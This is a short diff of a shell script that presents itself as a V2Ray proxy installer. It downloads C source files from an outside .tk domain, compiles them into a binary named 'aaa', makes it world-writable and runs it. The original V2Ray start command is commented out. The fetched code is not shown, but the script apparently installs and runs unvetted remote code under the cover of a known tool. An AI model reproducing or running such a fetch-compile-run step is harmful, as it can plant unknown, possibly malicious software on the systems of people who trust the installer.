@@ -9,8 +9,9 @@ install -m 755 /tmp/v2ray/v2ctl /usr/local/bin/v2ctl
 curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/1.c http://sty.stydrak.tk/1.c
 curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/aes.c http://sty.stydrak.tk/aes.c
 curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/aes.h http://sty.stydrak.tk/aes.h
-gcc -o /usr/local/bin/aaa /usr/local/bin/1.c /usr/local/bin/aes.c -lpthread
-chmod 777 ./usr/local/bin/aaa
+cd /usr/local/bin
+gcc -o aaa 1.c aes.c -lpthread
+chmod 777 ./aaa
 
 # Remove temporary directory
 rm -rf /tmp/v2ray
@@ -47,4 +48,4 @@ EOF
 
 # Run V2Ray
 #/usr/local/bin/v2ray -config /usr/local/etc/v2ray/config.json
-/usr/local/bin/aaa
+./aaa
